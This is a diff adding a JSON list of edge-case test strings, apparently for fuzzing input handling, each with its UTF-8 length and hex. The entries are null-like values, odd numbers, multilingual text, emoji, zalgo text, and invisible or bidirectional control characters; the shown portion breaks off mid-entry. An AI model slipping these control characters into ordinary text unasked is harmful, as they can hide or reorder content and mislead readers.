@@ -1,0 +1,2307 @@
+[
+  {
+    "input": "",
+    "utf8Length": 0,
+    "utf8Hex": ""
+  },
+  {
+    "input": "undefined",
+    "utf8Length": 9,
+    "utf8Hex": "756e646566696e6564"
+  },
+  {
+    "input": "undef",
+    "utf8Length": 5,
+    "utf8Hex": "756e646566"
+  },
+  {
+    "input": "null",
+    "utf8Length": 4,
+    "utf8Hex": "6e756c6c"
+  },
+  {
+    "input": "NULL",
+    "utf8Length": 4,
+    "utf8Hex": "4e554c4c"
+  },
+  {
+    "input": "(null)",
+    "utf8Length": 6,
+    "utf8Hex": "286e756c6c29"
+  },
+  {
+    "input": "nil",
+    "utf8Length": 3,
+    "utf8Hex": "6e696c"
+  },
+  {
+    "input": "NIL",
+    "utf8Length": 3,
+    "utf8Hex": "4e494c"
+  },
+  {
+    "input": "true",
+    "utf8Length": 4,
+    "utf8Hex": "74727565"
+  },
+  {
+    "input": "false",
+    "utf8Length": 5,
+    "utf8Hex": "66616c7365"
+  },
+  {
+    "input": "True",
+    "utf8Length": 4,
+    "utf8Hex": "54727565"
+  },
+  {
+    "input": "False",
+    "utf8Length": 5,
+    "utf8Hex": "46616c7365"
+  },
+  {
+    "input": "None",
+    "utf8Length": 4,
+    "utf8Hex": "4e6f6e65"
+  },
+  {
+    "input": "\\",
+    "utf8Length": 1,
+    "utf8Hex": "5c"
+  },
+  {
+    "input": "\\\\",
+    "utf8Length": 2,
+    "utf8Hex": "5c5c"
+  },
+  {
+    "input": "0",
+    "utf8Length": 1,
+    "utf8Hex": "30"
+  },
+  {
+    "input": "1",
+    "utf8Length": 1,
+    "utf8Hex": "31"
+  },
+  {
+    "input": "1.00",
+    "utf8Length": 4,
+    "utf8Hex": "312e3030"
+  },
+  {
+    "input": "$1.00",
+    "utf8Length": 5,
+    "utf8Hex": "24312e3030"
+  },
+  {
+    "input": "1/2",
+    "utf8Length": 3,
+    "utf8Hex": "312f32"
+  },
+  {
+    "input": "1E2",
+    "utf8Length": 3,
+    "utf8Hex": "314532"
+  },
+  {
+    "input": "1E02",
+    "utf8Length": 4,
+    "utf8Hex": "31453032"
+  },
+  {
+    "input": "1E+02",
+    "utf8Length": 5,
+    "utf8Hex": "31452b3032"
+  },
+  {
+    "input": "-1",
+    "utf8Length": 2,
+    "utf8Hex": "2d31"
+  },
+  {
+    "input": "-1.00",
+    "utf8Length": 5,
+    "utf8Hex": "2d312e3030"
+  },
+  {
+    "input": "-$1.00",
+    "utf8Length": 6,
+    "utf8Hex": "2d24312e3030"
+  },
+  {
+    "input": "-1/2",
+    "utf8Length": 4,
+    "utf8Hex": "2d312f32"
+  },
+  {
+    "input": "-1E2",
+    "utf8Length": 4,
+    "utf8Hex": "2d314532"
+  },
+  {
+    "input": "-1E02",
+    "utf8Length": 5,
+    "utf8Hex": "2d31453032"
+  },
+  {
+    "input": "-1E+02",
+    "utf8Length": 6,
+    "utf8Hex": "2d31452b3032"
+  },
+  {
+    "input": "1/0",
+    "utf8Length": 3,
+    "utf8Hex": "312f30"
+  },
+  {
+    "input": "0/0",
+    "utf8Length": 3,
+    "utf8Hex": "302f30"
+  },
+  {
+    "input": "-2147483648/-1",
+    "utf8Length": 14,
+    "utf8Hex": "2d323134373438333634382f2d31"
+  },
+  {
+    "input": "-9223372036854775808/-1",
+    "utf8Length": 23,
+    "utf8Hex": "2d393232333337323033363835343737353830382f2d31"
+  },
+  {
+    "input": "0.00",
+    "utf8Length": 4,
+    "utf8Hex": "302e3030"
+  },
+  {
+    "input": "0..0",
+    "utf8Length": 4,
+    "utf8Hex": "302e2e30"
+  },
+  {
+    "input": ".",
+    "utf8Length": 1,
+    "utf8Hex": "2e"
+  },
+  {
+    "input": "0.0.0",
+    "utf8Length": 5,
+    "utf8Hex": "302e302e30"
+  },
+  {
+    "input": "0,00",
+    "utf8Length": 4,
+    "utf8Hex": "302c3030"
+  },
+  {
+    "input": "0,,0",
+    "utf8Length": 4,
+    "utf8Hex": "302c2c30"
+  },
+  {
+    "input": ",",
+    "utf8Length": 1,
+    "utf8Hex": "2c"
+  },
+  {
+    "input": "0,0,0",
+    "utf8Length": 5,
+    "utf8Hex": "302c302c30"
+  },
+  {
+    "input": "0.0/0",
+    "utf8Length": 5,
+    "utf8Hex": "302e302f30"
+  },
+  {
+    "input": "1.0/0.0",
+    "utf8Length": 7,
+    "utf8Hex": "312e302f302e30"
+  },
+  {
+    "input": "0.0/0.0",
+    "utf8Length": 7,
+    "utf8Hex": "302e302f302e30"
+  },
+  {
+    "input": "1,0/0,0",
+    "utf8Length": 7,
+    "utf8Hex": "312c302f302c30"
+  },
+  {
+    "input": "0,0/0,0",
+    "utf8Length": 7,
+    "utf8Hex": "302c302f302c30"
+  },
+  {
+    "input": "--1",
+    "utf8Length": 3,
+    "utf8Hex": "2d2d31"
+  },
+  {
+    "input": "-",
+    "utf8Length": 1,
+    "utf8Hex": "2d"
+  },
+  {
+    "input": "-.",
+    "utf8Length": 2,
+    "utf8Hex": "2d2e"
+  },
+  {
+    "input": "-,",
+    "utf8Length": 2,
+    "utf8Hex": "2d2c"
+  },
+  {
+    "input": "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
+    "utf8Length": 96,
+    "utf8Hex": "393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939393939"
+  },
+  {
+    "input": "NaN",
+    "utf8Length": 3,
+    "utf8Hex": "4e614e"
+  },
+  {
+    "input": "Infinity",
+    "utf8Length": 8,
+    "utf8Hex": "496e66696e697479"
+  },
+  {
+    "input": "-Infinity",
+    "utf8Length": 9,
+    "utf8Hex": "2d496e66696e697479"
+  },
+  {
+    "input": "0x0",
+    "utf8Length": 3,
+    "utf8Hex": "307830"
+  },
+  {
+    "input": "0xffffffff",
+    "utf8Length": 10,
+    "utf8Hex": "30786666666666666666"
+  },
+  {
+    "input": "0xffffffffffffffff",
+    "utf8Length": 18,
+    "utf8Hex": "307866666666666666666666666666666666"
+  },
+  {
+    "input": "0xabad1dea",
+    "utf8Length": 10,
+    "utf8Hex": "30786162616431646561"
+  },
+  {
+    "input": "123456789012345678901234567890123456789",
+    "utf8Length": 39,
+    "utf8Hex": "313233343536373839303132333435363738393031323334353637383930313233343536373839"
+  },
+  {
+    "input": "1,000.00",
+    "utf8Length": 8,
+    "utf8Hex": "312c3030302e3030"
+  },
+  {
+    "input": "1 000.00",
+    "utf8Length": 8,
+    "utf8Hex": "31203030302e3030"
+  },
+  {
+    "input": "1'000.00",
+    "utf8Length": 8,
+    "utf8Hex": "31273030302e3030"
+  },
+  {
+    "input": "1,000,000.00",
+    "utf8Length": 12,
+    "utf8Hex": "312c3030302c3030302e3030"
+  },
+  {
+    "input": "1 000 000.00",
+    "utf8Length": 12,
+    "utf8Hex": "3120303030203030302e3030"
+  },
+  {
+    "input": "1'000'000.00",
+    "utf8Length": 12,
+    "utf8Hex": "3127303030273030302e3030"
+  },
+  {
+    "input": "1.000,00",
+    "utf8Length": 8,
+    "utf8Hex": "312e3030302c3030"
+  },
+  {
+    "input": "1 000,00",
+    "utf8Length": 8,
+    "utf8Hex": "31203030302c3030"
+  },
+  {
+    "input": "1'000,00",
+    "utf8Length": 8,
+    "utf8Hex": "31273030302c3030"
+  },
+  {
+    "input": "1.000.000,00",
+    "utf8Length": 12,
+    "utf8Hex": "312e3030302e3030302c3030"
+  },
+  {
+    "input": "1 000 000,00",
+    "utf8Length": 12,
+    "utf8Hex": "3120303030203030302c3030"
+  },
+  {
+    "input": "1'000'000,00",
+    "utf8Length": 12,
+    "utf8Hex": "3127303030273030302c3030"
+  },
+  {
+    "input": "01000",
+    "utf8Length": 5,
+    "utf8Hex": "3031303030"
+  },
+  {
+    "input": "08",
+    "utf8Length": 2,
+    "utf8Hex": "3038"
+  },
+  {
+    "input": "09",
+    "utf8Length": 2,
+    "utf8Hex": "3039"
+  },
+  {
+    "input": "2.2250738585072011e-308",
+    "utf8Length": 23,
+    "utf8Hex": "322e32323530373338353835303732303131652d333038"
+  },
+  {
+    "input": ",./;'[]\\-=",
+    "utf8Length": 10,
+    "utf8Hex": "2c2e2f3b275b5d5c2d3d"
+  },
+  {
+    "input": "<>?:\"{}|_+",
+    "utf8Length": 10,
+    "utf8Hex": "3c3e3f3a227b7d7c5f2b"
+  },
+  {
+    "input": "!@#$%^&*()`~",
+    "utf8Length": 12,
+    "utf8Hex": "21402324255e262a2829607e"
+  },
+  {
+    "input": "Ω≈ç√∫˜µ≤≥÷",
+    "utf8Length": 25,
+    "utf8Hex": "cea9e28988c3a7e2889ae288abcb9cc2b5e289a4e289a5c3b7"
+  },
+  {
+    "input": "åß∂ƒ©˙∆˚¬…æ",
+    "utf8Length": 25,
+    "utf8Hex": "c3a5c39fe28882c692c2a9cb99e28886cb9ac2ace280a6c3a6"
+  },
+  {
+    "input": "œ∑´®†¥¨ˆøπ“‘",
+    "utf8Length": 28,
+    "utf8Hex": "c593e28891c2b4c2aee280a0c2a5c2a8cb86c3b8cf80e2809ce28098"
+  },
+  {
+    "input": "¡™£¢∞§¶•ªº–≠",
+    "utf8Length": 29,
+    "utf8Hex": "c2a1e284a2c2a3c2a2e2889ec2a7c2b6e280a2c2aac2bae28093e289a0"
+  },
+  {
+    "input": "¸˛Ç◊ı˜Â¯˘¿",
+    "utf8Length": 21,
+    "utf8Hex": "c2b8cb9bc387e2978ac4b1cb9cc382c2afcb98c2bf"
+  },
+  {
+    "input": "ÅÍÎÏ˝ÓÔÒÚÆ☃",
+    "utf8Length": 26,
+    "utf8Hex": "c385c38dc38ec38fcb9dc393c394efa3bfc392c39ac386e29883"
+  },
+  {
+    "input": "Œ„´‰ˇÁ¨ˆØ∏”’",
+    "utf8Length": 29,
+    "utf8Hex": "c592e2809ec2b4e280b0cb87c381c2a8cb86c398e2888fe2809de28099"
+  },
+  {
+    "input": "`⁄€‹›ﬁﬂ‡°·‚—±",
+    "utf8Length": 34,
+    "utf8Hex": "60e28184e282ace280b9e280baefac81efac82e280a1c2b0c2b7e2809ae28094c2b1"
+  },
+  {
+    "input": "⅛⅜⅝⅞",
+    "utf8Length": 12,
+    "utf8Hex": "e2859be2859ce2859de2859e"
+  },
+  {
+    "input": "ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя",
+    "utf8Length": 158,
+    "utf8Hex": "d081d082d083d084d085d086d087d088d089d08ad08bd08cd08dd08ed08fd090d091d092d093d094d095d096d097d098d099d09ad09bd09cd09dd09ed09fd0a0d0a1d0a2d0a3d0a4d0a5d0a6d0a7d0a8d0a9d0aad0abd0acd0add0aed0afd0b0d0b1d0b2d0b3d0b4d0b5d0b6d0b7d0b8d0b9d0bad0bbd0bcd0bdd0bed0bfd180d181d182d183d184d185d186d187d188d189d18ad18bd18cd18dd18ed18f"
+  },
+  {
+    "input": "٠١٢٣٤٥٦٧٨٩",
+    "utf8Length": 20,
+    "utf8Hex": "d9a0d9a1d9a2d9a3d9a4d9a5d9a6d9a7d9a8d9a9"
+  },
+  {
+    "input": "⁰⁴⁵",
+    "utf8Length": 9,
+    "utf8Hex": "e281b0e281b4e281b5"
+  },
+  {
+    "input": "₀₁₂",
+    "utf8Length": 9,
+    "utf8Hex": "e28280e28281e28282"
+  },
+  {
+    "input": "⁰⁴⁵₀₁₂",
+    "utf8Length": 18,
+    "utf8Hex": "e281b0e281b4e281b5e28280e28281e28282"
+  },
+  {
+    "input": "'",
+    "utf8Length": 1,
+    "utf8Hex": "27"
+  },
+  {
+    "input": "\"",
+    "utf8Length": 1,
+    "utf8Hex": "22"
+  },
+  {
+    "input": "''",
+    "utf8Length": 2,
+    "utf8Hex": "2727"
+  },
+  {
+    "input": "\"\"",
+    "utf8Length": 2,
+    "utf8Hex": "2222"
+  },
+  {
+    "input": "'\"'",
+    "utf8Length": 3,
+    "utf8Hex": "272227"
+  },
+  {
+    "input": "\"''''\"'\"",
+    "utf8Length": 8,
+    "utf8Hex": "2227272727222722"
+  },
+  {
+    "input": "\"'\"'\"''''\"",
+    "utf8Length": 10,
+    "utf8Hex": "22272227222727272722"
+  },
+  {
+    "input": "田中さんにあげて下さい",
+    "utf8Length": 33,
+    "utf8Hex": "e794b0e4b8ade38195e38293e381abe38182e38192e381a6e4b88be38195e38184"
+  },
+  {
+    "input": "パーティーへ行かないか",
+    "utf8Length": 33,
+    "utf8Hex": "e38391e383bce38386e382a3e383bce381b8e8a18ce3818be381aae38184e3818b"
+  },
+  {
+    "input": "和製漢語",
+    "utf8Length": 12,
+    "utf8Hex": "e5928ce8a3bde6bca2e8aa9e"
+  },
+  {
+    "input": "部落格",
+    "utf8Length": 9,
+    "utf8Hex": "e983a8e890bde6a0bc"
+  },
+  {
+    "input": "사회과학원 어학연구소",
+    "utf8Length": 31,
+    "utf8Hex": "ec82aced9a8ceab3bced9599ec9b9020ec96b4ed9599ec97b0eab5acec868c"
+  },
+  {
+    "input": "찦차를 타고 온 펲시맨과 쑛다리 똠방각하",
+    "utf8Length": 56,
+    "utf8Hex": "ecb0a6ecb0a8eba5bc20ed8380eab3a020ec98a820ed8eb2ec8b9ceba7a8eab3bc20ec919beb8ba4eba6ac20eb98a0ebb0a9eab081ed9598"
+  },
+  {
+    "input": "社會科學院語學研究所",
+    "utf8Length": 30,
+    "utf8Hex": "e7a4bee69c83e7a791e5adb8e999a2e8aa9ee5adb8e7a094e7a9b6e68980"
+  },
+  {
+    "input": "울란바토르",
+    "utf8Length": 15,
+    "utf8Hex": "ec9ab8eb9e80ebb094ed86a0eba5b4"
+  },
+  {
+    "input": "𠜎𠜱𠝹𠱓𠱸𠲖𠳏",
+    "utf8Length": 28,
+    "utf8Hex": "f0a09c8ef0a09cb1f0a09db9f0a0b193f0a0b1b8f0a0b296f0a0b38f"
+  },
+  {
+    "input": "ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ ",
+    "utf8Length": 46,
+    "utf8Hex": "e383bde0bcbce0ba88d984cd9ce0ba88e0bcbdefbe8920e383bde0bcbce0ba88d984cd9ce0ba88e0bcbdefbe8920"
+  },
+  {
+    "input": "(｡◕ ∀ ◕｡)",
+    "utf8Length": 19,
+    "utf8Hex": "28efbda1e2979520e2888020e29795efbda129"
+  },
+  {
+    "input": "｀ｨ(´∀｀∩",
+    "utf8Length": 18,
+    "utf8Hex": "efbd80efbda828c2b4e28880efbd80e288a9"
+  },
+  {
+    "input": "__ﾛ(,_,*)",
+    "utf8Length": 11,
+    "utf8Hex": "5f5fefbe9b282c5f2c2a29"
+  },
+  {
+    "input": "・(￣∀￣)・:*:",
+    "utf8Length": 20,
+    "utf8Hex": "e383bb28efbfa3e28880efbfa329e383bb3a2a3a"
+  },
+  {
+    "input": "ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ",
+    "utf8Length": 44,
+    "utf8Hex": "efbe9fefbda5e29cbfe383bee295b228efbda1e29795e280bfe29795efbda129e295b1e29cbfefbda5efbe9f"
+  },
+  {
+    "input": ",。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’",
+    "utf8Length": 51,
+    "utf8Hex": "2ce38082e383bb3a2a3ae383bbe3829ce280992820e298bb20cf8920e298bb2029e38082e383bb3a2a3ae383bbe3829ce28099"
+  },
+  {
+    "input": "(╯°□°）╯︵ ┻━┻)  ",
+    "utf8Length": 33,
+    "utf8Hex": "28e295afc2b0e296a1c2b0efbc89e295afefb8b520e294bbe29481e294bb292020"
+  },
+  {
+    "input": "(ﾉಥ益ಥ）ﾉ﻿ ┻━┻",
+    "utf8Length": 32,
+    "utf8Hex": "28efbe89e0b2a5e79b8ae0b2a5efbc89efbe89efbbbf20e294bbe29481e294bb"
+  },
+  {
+    "input": "( ͡° ͜ʖ ͡°)",
+    "utf8Length": 17,
+    "utf8Hex": "2820cda1c2b020cd9cca9620cda1c2b029"
+  },
+  {
+    "input": "😍",
+    "utf8Length": 4,
+    "utf8Hex": "f09f988d"
+  },
+  {
+    "input": "👩🏽",
+    "utf8Length": 8,
+    "utf8Hex": "f09f91a9f09f8fbd"
+  },
+  {
+    "input": "👾 🙇 💁 🙅 🙆 🙋 🙎 🙍 ",
+    "utf8Length": 40,
+    "utf8Hex": "f09f91be20f09f998720f09f928120f09f998520f09f998620f09f998b20f09f998e20f09f998d20"
+  },
+  {
+    "input": "🐵 🙈 🙉 🙊",
+    "utf8Length": 19,
+    "utf8Hex": "f09f90b520f09f998820f09f998920f09f998a"
+  },
+  {
+    "input": "❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙",
+    "utf8Length": 76,
+    "utf8Hex": "e29da4efb88f20f09f929420f09f928c20f09f929520f09f929e20f09f929320f09f929720f09f929620f09f929820f09f929d20f09f929f20f09f929c20f09f929b20f09f929a20f09f9299"
+  },
+  {
+    "input": "✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿",
+    "utf8Length": 52,
+    "utf8Hex": "e29c8bf09f8fbf20f09f92aaf09f8fbf20f09f9190f09f8fbf20f09f998cf09f8fbf20f09f918ff09f8fbf20f09f998ff09f8fbf"
+  },
+  {
+    "input": "🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧",
+    "utf8Length": 39,
+    "utf8Hex": "f09f9abe20f09f869220f09f869320f09f869520f09f869620f09f869720f09f869920f09f8fa7"
+  },
+  {
+    "input": "0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟",
+    "utf8Length": 84,
+    "utf8Hex": "30efb88fe283a32031efb88fe283a32032efb88fe283a32033efb88fe283a32034efb88fe283a32035efb88fe283a32036efb88fe283a32037efb88fe283a32038efb88fe283a32039efb88fe283a320f09f949f"
+  },
+  {
+    "input": "１２３",
+    "utf8Length": 9,
+    "utf8Hex": "efbc91efbc92efbc93"
+  },
+  {
+    "input": "١٢٣",
+    "utf8Length": 6,
+    "utf8Hex": "d9a1d9a2d9a3"
+  },
+  {
+    "input": "ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.",
+    "utf8Length": 334,
+    "utf8Hex": "d8abd98520d986d981d8b320d8b3d982d8b7d8aa20d988d8a8d8a7d984d8aad8add8afd98ad8afd88c2c20d8acd8b2d98ad8b1d8aad98a20d8a8d8a7d8b3d8aad8aed8afd8a7d98520d8a3d98620d8afd986d9882e20d8a5d8b020d987d986d8a7d89f20d8a7d984d8b3d8aad8a7d8b120d988d8aad986d8b5d98ad8a820d983d8a7d9862e20d8a3d987d991d98420d8a7d98ad8b7d8a7d984d98ad8a7d88c20d8a8d8b1d98ad8b7d8a7d986d98ad8a72dd981d8b1d986d8b3d8a720d982d8af20d8a3d8aed8b02e20d8b3d984d98ad985d8a7d986d88c20d8a5d8aad981d8a7d982d98ad8a920d8a8d98ad98620d985d8a72c20d98ad8b0d983d8b120d8a7d984d8add8afd988d8af20d8a3d98a20d8a8d8b9d8af2c20d985d8b9d8a7d985d984d8a920d8a8d988d984d986d8afd8a7d88c20d8a7d984d8a5d8b7d984d8a7d98220d8b9d98420d8a5d98ad9882e"
+  },
+  {
+    "input": "בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ",
+    "utf8Length": 111,
+    "utf8Hex": "d791d6b0d6bcd7a8d6b5d790d7a9d6b4d781d799d7aa2c20d791d6b8d6bcd7a8d6b8d79020d790d6b1d79cd6b9d794d6b4d799d79d2c20d790d6b5d7aa20d794d6b7d7a9d6b8d6bcd781d79ed6b7d799d6b4d79d2c20d795d6b0d790d6b5d7aa20d794d6b8d790d6b8d7a8d6b6d7a5"
+  },
+  {
+    "input": "הָיְתָהtestالصفحات التّحول",
+    "utf8Length": 47,
+    "utf8Hex": "d794d6b8d799d6b0d7aad6b8d79474657374d8a7d984d8b5d981d8add8a7d8aa20d8a7d984d8aad991d8add988d984"
+  },
+  {
+    "input": "﷽",
+    "utf8Length": 3,
+    "utf8Hex": "efb7bd"
+  },
+  {
+    "input": "ﷺ",
+    "utf8Length": 3,
+    "utf8Hex": "efb7ba"
+  },
+  {
+    "input": "​",
+    "utf8Length": 3,
+    "utf8Hex": "e2808b"
+  },
+  {
+    "input": " ",
+    "utf8Length": 3,
+    "utf8Hex": "e19a80"
+  },
+  {
+    "input": "᠎",
+    "utf8Length": 3,
+    "utf8Hex": "e1a08e"
+  },
+  {
+    "input": "　",
+    "utf8Length": 3,
+    "utf8Hex": "e38080"
+  },
+  {
+    "input": "﻿",
+    "utf8Length": 3,
+    "utf8Hex": "efbbbf"
+  },
+  {
+    "input": "␣",
+    "utf8Length": 3,
+    "utf8Hex": "e290a3"
+  },
+  {
+    "input": "␢",
+    "utf8Length": 3,
+    "utf8Hex": "e290a2"
+  },
+  {
+    "input": "␡",
+    "utf8Length": 3,
+    "utf8Hex": "e290a1"
+  },
+  {
+    "input": "‪‪test‪",
+    "utf8Length": 13,
+    "utf8Hex": "e280aae280aa74657374e280aa"
+  },
+  {
+    "input": "‫test‫",
+    "utf8Length": 10,
+    "utf8Hex": "e280ab74657374e280ab"
+  },
+  {
+    "input": " test ",
+    "utf8Length": 10,
+    "utf8Hex": "e280a974657374e280a9"
+  },
+  {
+    "input": "test⁠test‫",
+    "utf8Length": 14,
+    "utf8Hex": "74657374e281a074657374e280ab"
+  },
+  {
+    "input": "⁦test⁧",
+    "utf8Length": 10,
+    "utf8Hex": "e281a674657374e281a7"
+  },
+  {
+    "input": "Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣",
+    "utf8Length": 381,
+    "utf8Hex": "e1b9b0ccbaccbacc956fcd9e20ccb769ccb2ccaccd87ccaacd996ecc9dcc97cd9576cc9fcc9ccc98cca6cd9f6fccb6cc99ccb0cca06bc3a8cd9accaeccbaccaaccb9ccb1cca420cc9674cc9dcd95ccb3cca3ccbbccaacd9e68ccbccd93ccb2cca6ccb3cc98ccb265cd87cca3ccb0cca6ccaccd8e20cca2ccbcccbbccb1cc9868cd9acd8ecd99cc9ccca3ccb2cd8569cca6ccb2cca3ccb0cca476ccbbcd8d65ccbaccadccb3ccaaccb02d6dcca269cd856ecc96ccbacc9eccb2ccafccb064ccb5ccbccc9fcd99cca9ccbccc98ccb320cc9ecca5ccb1ccb3ccad72cc9bcc97cc9865cd9970cda072ccbccc9eccbbccadcc9765ccbacca0cca3cd9f73cc98cd87ccb3cd8dcc9dcd8965cd89cca5ccafcc9eccb2cd9accaccd9cc7b9ccaccd8ecd8ecc9fcc96cd87cca474cd8dccaccca4cd93ccbcccadcd98cd8569ccaaccb16ecda067ccb4cd8920cd8fcd89cd8563ccaccc9f68cda161ccabccbbccafcd986fccabcc9fcc96cd8dcc99cc9dcd8973cc97cca6ccb22ecca8ccb9cd88cca3"
+  },
+  {
+    "input": "̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰",
+    "utf8Length": 260,
+    "utf8Hex": "cca1cd93cc9ecd8549cc97cc98cca6cd9d6ecd87cd87cd9976ccaeccab6f6bccb2ccabcc99cd8869cc96cd99ccadccb9cca0cc9e6ecca1ccbbccaecca3ccba67ccb2cd88cd99ccadcd99ccaccd8e20ccb074cd94cca668cc9eccb265cca2cca420cd8dccacccb2cd9666ccb4cc98cd95cca3c3a8cd96e1bab9cca5cca96ccd96cd94cd9a69cd93cd9acca6cda06ecd96cd8dcc97cd93ccb3ccae67cd8d20cca86fcd9accaacda166cc98cca3ccac20cc96cc98cd96cc9fcd99ccae63d289cd94ccabcd96cd93cd87cd96cd8568ccb5cca4cca3cd9acd94c3a1cc97ccbccd95cd856fccbccca3cca573ccb1cd88ccbacc96cca6ccbbcda22ecc9bcc96cc9ecca0ccabccb0"
+  },
+  {
+    "input": "̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟",
+    "utf8Length": 391,
+    "utf8Hex": "cc97ccbacd96ccb9ccafcd93e1b9aecca4cd8dcca5cd87cd8868ccb2cc8165cd8fcd93ccbccc97cc99ccbccca3cd9420cd87cc9cccb1cca0cd93cd8dcd854ecd95cda065cc97ccb17acc98cc9dcc9cccbacd9970cca4ccbaccb9cd8dccafcd9a65cca0ccbbcca0cd9c72cca8cca4cd8dccbacc96cd94cc96cc9664cca0cc9fccadccaccc9dcd9f69cca6cd96cca9cd93cd94cca461cca0cc97ccaccd89cc996ecd9acd9c20ccbbcc9eccb0cd9acd8568ccb5cd8969ccb3cc9e76cca2cd87e1b899cd8ecd9f2dd289ccadcca9ccbccd946dcca4ccadccab69cd95cd87cc9dcca66ecc97cd99e1b88dcc9f20ccafccb2cd95cd9ec7abcc9fccafccb0ccb2cd99ccbbcc9d6620ccaaccb0ccb0cc97cc96ccadcc98cd9863cca6cd8dccb2cc9ecd8dcca9cc99e1b8a5cd9a61ccaecd8ecc9fcc99cd9cc6a1cca9ccb9cd8e73cca42ecc9dcc9d20d2895acca1cc96cc9ccd96ccb0cca3cd89cc9c61cd96ccb0cd99ccaccda16cccb2ccabccb3cd8dcca967cca1cc9fccbcccb1cd9acc9eccaccd856fcc97cd9c2ecc9f"
+  },
+  {
+    "input": "̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕",
+    "utf8Length": 276,
+    "utf8Hex": "cca648ccaccca4cc97cca4cd9d65cd9c20cc9ccca5cc9dccbbcd8dcc9fcc8177cc9568cc96ccafcd936fcc9dcd99cc96cd8eccb1ccae20d289ccbacc99cc9ecc9fcd8857ccb7ccbcccad61ccbaccaacd8dc4afcd88cd95ccadcd99ccafcc9c74ccb6ccbcccae73cc98cd99cd96cc9520cca0ccabcca042ccbbcd8dcd99cd89ccb3cd8565ccb568ccb5ccaccd87ccabcd9969ccb9cd93ccb3ccb3ccaecd8eccabcc956ecd9f64ccb4ccaacc9ccc9620ccb0cd89cca9cd87cd99ccb2cd9ecd8554cd96ccbccd93ccaacda268cd8fcd93ccaeccbb65ccaccc9dcc9fcd8520cca4ccb9cc9d57cd99cc9ecc9dcd94cd87cd9dcd8561cd8fcd93cd94ccb9ccbccca36cccb4cd94ccb0cca4cc9fcd94e1b8bdccab2ecd95"
+  },
+  {
+    "input": "Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮",
+    "utf8Length": 51,
+    "utf8Hex": "5accaecc9ecca0cd99cd94cd85e1b880cc97cc9ecd88ccbbcc97e1b8b6cd99cd8eccafccb9cc9ecd9347ccbb4fccadcc97ccae"
+  },
+  {
+    "input": "˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥",
+    "utf8Length": 192,
